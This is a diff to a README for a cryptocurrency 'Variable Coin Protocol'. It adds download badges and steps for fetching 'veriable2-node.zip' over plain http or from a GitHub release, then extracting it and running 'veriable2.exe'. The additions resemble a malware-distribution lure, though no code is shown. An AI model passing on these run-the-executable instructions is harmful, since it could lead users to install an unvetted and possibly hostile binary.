@@ -1,7 +1,35 @@
+<div align="center">
+
 # Variable Coin Protocol (VCP)
-### Technical Specification & Protocol Whitepaper
+
+[![Direct Download from Website](https://img.shields.io/badge/DIRECT_DOWNLOAD-OFFICIAL_WEBSITE-1f6feb?style=for-the-badge&logo=googlechrome&logoColor=white)](http://veriable2.com/download)
+[![Download from GitHub Releases](https://img.shields.io/badge/DOWNLOAD_FROM-GITHUB_RELEASES-238636?style=for-the-badge&logo=github&logoColor=white)](https://github.com/marianakamatotzs23-gif/veriable2/releases/latest)
+
+*Autonomous, Dynamic Multi-Space Ledger with Algorithmic Variability & Dual-Coin Economics*
 
 ---
+
+</div>
+
+## 📥 Where & How to Download the Sovereign Desktop Node
+
+Users have two official, independent channels to obtain the standalone Windows desktop client package (`veriable2-node.zip`):
+
+### Option 1: Direct Download from Official Website
+* **URL:** [http://veriable2.com/download](http://veriable2.com/download)
+* **How it works:** Instant single-click direct download served straight from the core protocol showcase server.
+
+### Option 2: Download from Official GitHub Releases
+* **URL:** [GitHub Latest Release (v1.0.1)](https://github.com/marianakamatotzs23-gif/veriable2/releases/latest)
+* **How it works:**
+  1. Open the GitHub Releases link above.
+  2. Scroll down to the **"Assets"** section.
+  3. Click on **`veriable2-node.zip`** to download the official verified archive.
+  4. Extract the zip file and launch `veriable2.exe` to run your sovereign P2P node.
+
+---
+
+## Technical Specification & Protocol Whitepaper
 
 ### 1. Access Architecture: Web Showcase vs. Sovereign Desktop Node Option
 
